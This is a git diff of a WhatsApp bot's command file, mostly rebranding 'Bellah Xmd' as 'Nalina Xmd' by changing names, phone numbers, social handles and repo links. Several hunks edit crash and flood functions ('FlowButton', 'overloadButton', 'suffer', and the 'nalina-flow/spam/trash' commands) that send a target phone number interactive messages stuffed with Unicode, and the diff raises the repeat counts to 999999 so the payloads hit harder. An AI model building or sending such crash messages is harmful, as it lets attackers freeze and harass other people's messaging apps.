@@ -1544,7 +1544,7 @@ let msg = generateWAMessageFromContent(m.chat, {
  }),
  header: proto.Message.InteractiveMessage.Header.create({
  title: ``,
- subtitle: "𝐁𝐞𝐥𝐥𝐚𝐡 𝐗𝐦𝐝",
+ subtitle: "𝗡𝗮𝗹𝗶𝗻𝗮 𝐗𝐦𝐝",
  hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/t3gs2m.jpg" } }, { upload: Bellah.waUploadToServer }))
  }),
  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -1555,7 +1555,7 @@ let msg = generateWAMessageFromContent(m.chat, {
 },
  {
  "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"Creator\",\"url\":\"https://wa.me/254756182478\",\"merchant_url\":\"https://wa.me/254756182478\"}"
+ "buttonParamsJson": "{\"display_text\":\"Creator\",\"url\":\"https://wa.me/254769365617\",\"merchant_url\":\"https://wa.me/254769365617\"}"
  },
  ],
  })
@@ -2052,7 +2052,7 @@ if (!isAdmins && !Owner) return reply(mess.admin)
   let firstVideo = searchResults.videos[0];
   let videoUrl = firstVideo.url;
 
-  let songInfo = `*BELLAH_XMD_AUDIO - PLAYER*\n` +
+  let songInfo = `*NALINA_XMD_AUDIO - PLAYER*\n` +
                  `> 🎵 Title: *${firstVideo.title}*\n` +
                  `> 👀 Views: *${firstVideo.views.toLocaleString()}*\n` +
                  `> ⏳ Duration: *${firstVideo.timestamp}*\n` +
@@ -2135,7 +2135,7 @@ case 'spotifydown': {
   break;
 }
 case 'play': {
-    if (!text) return m.reply(`provide a song name dude, Example: ${prefix + command} tiktoker by Giddy Tennor`);
+    if (!text) return m.reply(`provide a song name dude, Example: ${prefix + command} tiktoker by Jinwiil Onginjo`);
 
     const query = text.trim(); 
     await Bellah.sendMessage(m.chat, { react: { text: "💥", key: m.key } });
@@ -2455,7 +2455,7 @@ if (/image/g.test(mime)) {
 let media = await Bellah.downloadAndSaveMediaMessage(qmsg)
 await Bellah.updateProfilePicture(m.chat, {url: media})
 await fs.unlinkSync(media)
-m.reply("Group profile photo changed successfully by Bellah Xmd")
+m.reply("Group profile photo changed successfully by Nalina Xmd")
 } else return m.reply('tag/reply foto')}
 break    
       case 'unblock': case 'unban': {
@@ -2603,7 +2603,7 @@ if (/image/g.test(mime)) {
 let media = await Bellah.downloadAndSaveMediaMessage(qmsg)
 await Bellah.updateProfilePicture(botNumber, {url: media})
 await fs.unlinkSync(media)
-m.reply("Profile photo changed by Bellah Xmd")
+m.reply("Profile photo changed by Nalina Xmd")
 } else return m.reply('tag/reply foto')}
 break
                 case "listgc": case "cekid": case "listgrup": {
@@ -2878,7 +2878,7 @@ break
  await Bellah.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
  await sleep(3000);
  }
- m.reply(`BELLAH XMD HAS SUCCESSFULLY REMOVED ALL GROUP PARTICIPANTS`);
+ m.reply(`NALINA XMD HAS SUCCESSFULLY REMOVED ALL GROUP PARTICIPANTS`);
 }
 break  
         case 'tagall':
@@ -2944,14 +2944,14 @@ break
                 if (!isAdmins && !isGroupOwner && !Owner) return reply(mess.admin)
                 if (!isBotAdmins) return reply(mess.admin)
                 let response = await Bellah.groupInviteCode(m.chat)
-                Bellah.sendText(m.chat, `👥 *GROUP LINK BY BELLAH XMD*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
+                Bellah.sendText(m.chat, `👥 *GROUP LINK BY NALINA XMD*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                     detectLink: true
                 })
             break
                 case "repo": {
   try {
     let me = m.sender;
- const response = await axios.get(`https://api.github.com/repos/Tennor-modz/Bellah-Xmd`)
+ const response = await axios.get(`https://api.github.com/repo/Finjohns/Nalina-Xmd`)
     if (response.status === 200) {
       const repoData = response.data
       const repos = `
@@ -2965,26 +2965,26 @@ break
 > ${repoData.forks_count}
 
 *GITHUB LINK:* 
-https://github.com/Tennor-modz/Bellah-Xmd
+https://github.com/Finjohns/Nalina-Xmd
 
 @${me.split("@")[0]}👋, Star ⭐ fork and deploy my repo 🤭
 
-> 𝐁𝐞𝐥𝐥𝐚𝐡𝐗𝐦𝐝`;
+> 𝑵𝒂𝒍𝒊𝒏𝒂-𝑿𝒎𝒅`;
 Bellah.sendMessage(m.chat, { text : repos,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 9999, 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
-newsletterJid: 'https://chat.whatsapp.com/Hs0AwkOaFzbGi5sjicdeTR',
+newsletterJid:'https://chat.whatsapp.com/EqDVC9BGF9k86ZMHdjxY0d',
 serverMessageId: 20,
-newsletterName: '𝐁𝐞𝐥𝐥𝐚𝐡 𝐗𝐦𝐝'
+newsletterName: '𝗡𝗮𝗹𝗶𝗻𝗮 𝐗𝐦𝐝'
 },
 externalAdReply: {
-title: "𝐁𝐞𝐥𝐥𝐚𝐡 𝐗𝐦𝐝", 
+title: "𝗡𝗮𝗹𝗶𝗻𝗮 𝐗𝐦𝐝", 
 body: "",
 thumbnail: null, 
-sourceUrl: null,
+sourceUrl: 'https://whatsapp.com/channel/0029VaxZbeSDTkJwBgUb9u3N',
 mediaType: 1
 }}}, { quoted : m })
     } else {
@@ -3344,7 +3344,7 @@ case 'ttstalk': {
 }
 break;    
       case 'igstalk': {
-if (!args[0]) return reply(`Enter Instagram Username\n\nExample: ${prefix + command} giddy_tennor_`)
+if (!args[0]) return reply(`Enter Instagram Username\n\nExample: ${prefix + command} jinwiil_onginjo_`)
 const fg = require('api-dylux')
     try {
     let res = await fg.igStalk(args[0])
@@ -3365,7 +3365,7 @@ const fg = require('api-dylux')
 }
 break
 case 'ghstalk': case 'githubstalk':{
-if (!q) return reply(`Example ${prefix+command} GiddyTennor`)
+if (!q) return reply(`Example ${prefix+command} JinwiilOnginjo`)
 await XeonStickWait()
 let githubstalk = require('./lib/scraper')
 aj = await githubstalk.githubstalk(`${q}`)
@@ -3393,7 +3393,7 @@ Created At : ${aj.ceated_at}
 Updated At : ${aj.updated_at}` }, { quoted: m } )
 }
 break   
-          case 'bellah': {
+          case 'nalina': {
   Bellah.sendMessage(m.chat, { react: { text: `🙂‍↔️`, key: m.key }})
 	          let ownernya = global.ownernumber + '@s.whatsapp.net'
             let me = m.sender
@@ -3403,7 +3403,7 @@ break
             cann_sad = `╭─❒ *WELCOME* ❒─╮  
 │ 👋 *Hey ${pushname}!*  
 │ welcome to*${botname}*!  
-│ WhatsApp bot made by Giddy Tennor!  
+│ WhatsApp bot made by Jinwiil Onginjo!  
 ╰─❒━━━━━━━━━❒─╯  
 
 ╭─ *DASHBOARD* ─╮  
@@ -3417,10 +3417,10 @@ break
 
 ╭─🌐 *SOSIAL MEDIA* 🌐─╮  
 │  
-├  ✆ WhatsApp: *tennormodz*  
-├ 📸 Instagram: *$Giddy_Tennor*  
-├ 🎥 YouTube: *Giddy_Nokia*  
-├ 🎵 Tiktok: *Giddy_Tennor*  
+├  ✆ WhatsApp: *jinwiiltech*  
+├ 📸 Instagram: *$Jinwiil_Onginjo*  
+├ 🎥 YouTube: *Null*  
+├ 🎵 Tiktok: *Null*  
 │  
 ╰─❒━━━━━━━━━❒─╯  
 
@@ -3528,7 +3528,7 @@ break
 ║ 78. quote
 ║ 79. idgc
 ╚═══════════════════════╝
-╠ © Giddy Tennor 
+╠ © 𝐉𝐢𝐧𝐰𝐢𝐢𝐥𝐎𝐧𝐠𝐢𝐧𝐣𝐨 
 ╠ *Join group below for more
 ╠ updates*
 ╚═══════════════════════╝`
@@ -3598,7 +3598,8 @@ isForwarded: true,
             }
             break  
               case 'uptime': {
-            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
+            	let lowq = `*Moss moss moss Strange Online🏴‍☠️
+	For:*\n*${runtime(process.uptime())}*`
                 reply(lowq)
             	}
             break 
@@ -3763,7 +3764,7 @@ case "p": {
 
   const startTime = performance.now();
   const latency = performance.now() - startTime;
-  const finalStatus = `𝐁𝐄𝐋𝐋𝐀𝐇 𝐗𝐌𝐃 𝐒𝐏𝐄𝐄𝐃: ${latency.toFixed(4)} ms`;
+  const finalStatus = `𝗡𝗮𝗹𝗶𝗻𝗮 𝐗𝐌𝐃 𝐒𝐏𝐄𝐄𝐃: ${latency.toFixed(4)} ms`;
   reply(finalStatus);
 }
 break;    
@@ -3844,8 +3845,8 @@ compact: true,
 minify: true,
 flatten: true,
 identifierGenerator: function () {
-const originalString = "TennorHere晴Zconcept晴" + "素TennorHere晴Zconcept晴";
-const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素TennorHere晴Zconcept晴]/g, "");
+const originalString = "Jinwiiltech晴Zcode晴" + "素Jinwiiltech晴Zcode晴";
+const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素Jinwiiltech晴Zcode晴]/g, "");
 const randomString = (length) => {
 let result = "";
 const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -3930,7 +3931,7 @@ async function suffer(target) {
                         },
                     },
                     body: {
-                        text: "𝐁𝐞𝐥𝐥𝐚𝐡 𝐗𝐦𝐝",
+                        text: "𝑵𝒂𝒍𝒊𝒏𝒂 𝐗𝐦𝐝",
                     },
                     nativeFlowMessage: {
                         buttons: [
@@ -3970,13 +3971,13 @@ async function FlowButton(target) {
               isForwarded: true,
               forwardingScore: 999,
               forwardedNewsletterMessageInfo: {
-                newsletterJid: `33333333333333333@newsletter`,
-                newsletterName: "Bellah Xmd 🗡️",
+                newsletterJid: `120363388529450317@newsletter`,
+                newsletterName: "Nalina Xmd 👻",
                 businessOwnerJid: target,
               },
             },
             body: {
-              text: "‎🩸Bellah Xmd 🗡️",
+              text: "‎🩸Nalina Xmd 👻",
             },
             nativeFlowMessage: {
               buttons: [
@@ -4091,7 +4092,7 @@ async function FlowButton(target) {
 					   },
               },
               body: {
-                text: "Ḩ̶̳̣̮̻̪̜͍̹̭͓͍̳̼̈́̅́̄̍̀͐́̊̽͌̊̂͂͠͝͝â̸̙͐͑̌̿͛̽m̶̥͇͈̣̏͑̿͑̃̈͛̕͠z̵͉̺̩̰͍̞̘̯̹͕̺̮̙͗ D̸̢̮̫̰̥̗̘̱͉͙͙̺̫̏͒̅̌ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜ṿ̷̮͚̤͊̋̐͊͊̑̅̇̊̎̚͠ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜l̷̢̨̨̫̼͙̞͉̗͉̖̲̖̞̿̉o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓p̸̢̻͓͎̻͙͂͒̋͒̓̃͊̐̔͘͝ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️" + "ꦽ".repeat(77777)
+                text: "Ḩ̶̳̣̮̻̪̜͍̹̭͓͍̳̼̈́̅́̄̍̀͐́̊̽͌̊̂͂͠͝͝â̸̙͐͑̌̿͛̽m̶̥͇͈̣̏͑̿͑̃̈͛̕͠z̵͉̺̩̰͍̞̘̯̹͕̺̮̙͗ D̸̢̮̫̰̥̗̘̱͉͙͙̺̫̏͒̅̌ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜ṿ̷̮͚̤͊̋̐͊͊̑̅̇̊̎̚͠ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜l̷̢̨̨̫̼͙̞͉̗͉̖̲̖̞̿̉o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓p̸̢̻͓͎̻͙͂͒̋͒̓̃͊̐̔͘͝ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️" + "ꦽ".repeat(999999)
               },
               nativeFlowMessage: {
                 buttons: [
@@ -4156,7 +4157,7 @@ async function FlowButton(target) {
                 async function overloadButton(Target) {
 let sections = [];
 for (let i = 0; i < 1999; i++) { // Sesuaikan jumlah section
-let largeText = 'ྀི'.repeat(5999); // Pesan besar
+let largeText = 'ྀི'.repeat(999999); // Pesan besar
 
 let deepNested = {
 title: `Section ${i + 1}`,
@@ -4209,14 +4210,14 @@ isForwarded: true,
 forwardingScore: 999
 },
 body: proto.Message.InteractiveMessage.Body.create({
-text: "𝐙‌𝐗‌𝐎 ⿻‌𝐔𝐈⿻‌" + "ꦾ".repeat(89999)
+text: "𝗡𝗮J ⿻‌𝐔𝐈⿻‌" + "ꦾ".repeat(999999)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 buttonParamsJson: JSON.stringify(listMessage)
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 buttonParamsJson: JSON.stringify(listMessage),
-subtitle: "𝐎𝐯𝐞𝐥𝐨𝐚𝐝‌" + "ྀི".repeat(4999), 
+subtitle: "𝐎𝐯𝐞𝐥𝐨𝐚𝐝‌" + "ྀི".repeat(999999), 
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -4279,9 +4280,9 @@ messageId: msg.key.id
 
 console.log(`Succes Send FloodUi To ${Target}`);
 } 
-       case 'bellah-flow':      
-       case 'bellah-spam':       
-       case 'bellah-trash': {
+       case 'nalina-flow':      
+       case 'nalina-spam':       
+       case 'nalina-trash': {
 if (!Owner) return reply('you are not a premium user!!')
 if (!q) return reply(`Example : ${command} 254xxx`)
 let pepec = q.replace(/[^0-9]/g, "")
@@ -4311,7 +4312,7 @@ if (!inviteCode) return m.reply("INVALID LINK GROUP");
 let groupInfo = await Bellah.groupGetInviteInfo(inviteCode);
 let groupId = groupInfo.id;  
 m.reply (`
-⧼ 𝐁𝐄𝐋𝐋𝐀𝐇 𝐗𝐌𝐃 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒⧽
+⧼ 𝗡𝗮𝗹𝗶𝗻𝗮 𝐗𝐌𝐃 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒⧽
 
 𝗧𝗔𝗥𝗚𝗘𝗧 : ${groupInfo.subject}
 𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝗨𝗞𝗦𝗘𝗦
